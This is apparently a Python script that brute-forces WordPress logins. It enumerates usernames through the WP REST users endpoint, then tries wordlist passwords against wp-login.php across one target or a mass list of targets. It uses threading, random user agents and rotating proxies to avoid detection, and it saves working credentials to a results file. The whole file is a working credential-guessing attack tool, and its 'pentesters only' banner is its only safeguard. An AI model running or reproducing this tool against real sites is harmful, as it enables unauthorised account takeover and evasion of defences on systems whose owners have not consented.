import requests
import threading
import os
import logging
from concurrent.futures import ThreadPoolExecutor
import random
import colorama
from colorama import Fore, Style

colorama.init(autoreset=True)

# ------------ CONFIGURATION ----------
curl_timeout = 20
multithread_limit = 10
# -------------------------------------

red = Fore.RED
gr = Fore.GREEN
yel = Fore.YELLOW
clr = Style.RESET_ALL

logging.basicConfig(filename="bruteforce.log", level=logging.INFO, format="%(asctime)s - %(message)s")

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def get_user_wp_json(target, proxies=None):
    try:
        headers = {'User-Agent': generate_user_agent()}
        response = requests.get(f"{target}/wp-json/wp/v2/users", timeout=curl_timeout, proxies=proxies, headers=headers)
        if response.status_code == 200:
            users = [user['slug'] for user in response.json()]
            if users:
                print(f"{gr}[+] Found usernames: {', '.join(users)}{clr}")
                return users
        print(f"{yel}[-] No usernames found via WP-JSON.{clr}")
    except Exception as e:
        print(f"{red}[-] Error fetching WP-JSON: {e}{clr}")
    return None

def generate_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    ]
    return random.choice(user_agents)

stop_event = threading.Event()  # Event untuk menghentikan proses

def test_login(target, username, password, proxies=None):
    if stop_event.is_set():  # Cek apakah harus berhenti
        return
    
    try:
        session = requests.Session()
        login_data = {'log': username, 'pwd': password, 'wp-submit': 'Log In'}
        headers = {'User-Agent': generate_user_agent()}
        response = session.post(f"{target}/wp-login.php", data=login_data, timeout=curl_timeout, proxies=proxies, headers=headers, allow_redirects=True)

        if 'login_error' not in response.text and 'wp-admin' in response.url:
            print(f"{gr}[+] Found valid credentials: {username}:{password}{clr}")
            logging.info(f"Valid credentials: {username}:{password}")
            with open("results.txt", "a") as f:
                f.write(f"{target} {username}:{password}\n")
            stop_event.set() 
        else:
            print(f"{yel}[-] Invalid: {username}:{password}{clr}")
    except Exception as e:
        print(f"{red}[-] Error testing {username}:{password} - {e}{clr}")

def load_proxies(proxy_file):
    try:
        with open(proxy_file, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{red}[-] Proxy file not found: {proxy_file}{clr}")
        return []

def main():
    try:
        clear_screen()
        print(f"""{Fore.YELLOW}
         _____   ______ ______   _____   ______ _______ _______ _______
|  |  | |     | |_____/ |     \ |_____] |_____/ |______ |______ |______
|__|__| |_____| |    \_ |_____/ |       |    \_ |______ ______| ______|
                                                                        
                    {Fore.WHITE}W O R D P R E S S   B R U T E F O R C E   T O O L           
          {Fore.BLUE}XenpaiBot Is Number One Bot For Pentester
          {Fore.WHITE}Author : {Fore.YELLOW}Kanezama              
    {Style.RESET_ALL}""")
        print(f"{Fore.BLUE}This is for Pentesters Only, Don't Try It For Illegal Things{Style.RESET_ALL}")
        print(f"{Fore.BLUE}Author: Kanezama{clr}")

        choice = input(Fore.CYAN + "\n[1] " + Fore.WHITE  + "Single Target"+ Fore.CYAN + "\n[2] " + Fore.WHITE + "Mass Target\n\nChoose an option: " + clr).strip()
        targets = []

        if choice == "1":
            target = input(Fore.GREEN + "[!] Enter target site: " + clr).strip()
            if not target.startswith("http"):
                target = f"http://{target}"
            targets.append(target)
        elif choice == "2":
            target_file = input(Fore.GREEN + "[!] Enter path to target file: " + clr).strip()
            try:
                with open(target_file, "r") as f:
                    targets = [line.strip() for line in f.readlines()]
                print(f"{gr}[+] Loaded {len(targets)} targets{clr}")
            except FileNotFoundError:
                print(f"{red}[-] Target file not found: {target_file}{clr}")
                return
        else:
            print(f"{red}[-] Invalid choice!{clr}")
            return

        script_dir = os.path.dirname(os.path.abspath(__file__))
        default_wordlist_path = os.path.join(script_dir, "pwd.txt")

        def load_wordlist(file_path):
            try:
                with open(file_path, "r") as f:
                    return [line.strip() for line in f.readlines() if line.strip()]
            except FileNotFoundError:
                print(f"{Fore.RED}[-] Wordlist file not found: {file_path}{Style.RESET_ALL}")
                return []

        passwords = []

        if os.path.exists(default_wordlist_path):
            print(f"\n{Fore.GREEN}[+] Detected wordlist file: {default_wordlist_path}{Style.RESET_ALL}")
            use_default = input(Fore.GREEN + "[?] Use default wordlist (pwd.txt)? (y/n): " + Style.RESET_ALL).strip().lower()

            if use_default == "y":
                passwords = load_wordlist(default_wordlist_path)
            else:
                custom_wordlist_path = input(Fore.GREEN + "[!] Enter your custom wordlist file: " + Style.RESET_ALL).strip()
                if os.path.isfile(custom_wordlist_path):
                    passwords = load_wordlist(custom_wordlist_path)
                else:
                    print(f"{Fore.RED}[-] Wordlist file not found: {custom_wordlist_path}{Style.RESET_ALL}")
                    exit(1)
        else:
            print(f"{Fore.RED}[-] Default wordlist (pwd.txt) not found! Please select a wordlist file.{Style.RESET_ALL}")
            custom_wordlist_path = input(Fore.GREEN + "[!] Enter your wordlist file: " + Style.RESET_ALL).strip()
            if os.path.isfile(custom_wordlist_path):
                passwords = load_wordlist(custom_wordlist_path)
            else:
                print(f"{Fore.RED}[-] Wordlist file not found: {custom_wordlist_path}{Style.RESET_ALL}")
                exit(1)

        print(f"{Fore.GREEN}[+] Loaded {len(passwords)} passwords from wordlist{Style.RESET_ALL}")

        use_proxy = input(Fore.GREEN + "[?] Use proxy? (y/n): " + clr).strip().lower()
        proxies_list = []
        if use_proxy == "y":
            proxy_file = input(Fore.GREEN + "[!] Enter proxy file: " + clr).strip()
            proxies_list = load_proxies(proxy_file)

        for target in targets:
            usernames = get_user_wp_json(target)
            if not usernames:
                print(f"{yel}[-] No valid usernames for {target}{clr}")
                continue

            global stop_event  
            try:
                clear_screen()
                print("\n[+] Starting brute-force... Press Ctrl+C to stop\n")

                with ThreadPoolExecutor(max_workers=multithread_limit) as executor:
                    for username in usernames:
                        for password in passwords:
                            if stop_event.is_set():  
                                break
                            proxy = {'http': random.choice(proxies_list), 'https': random.choice(proxies_list)} if proxies_list else None
                            executor.submit(test_login, target, username, password, proxy)

            except KeyboardInterrupt:
                print(f"\n{red}[-] Interrupted by user{clr}")
                stop_event.set()  
            except Exception as e:
                print(f"{red}[-] Critical error: {e}{clr}")

    except Exception as e:
        print(f"{red}[-] Unexpected error: {e}{clr}")

if __name__ == "__main__":
    main()
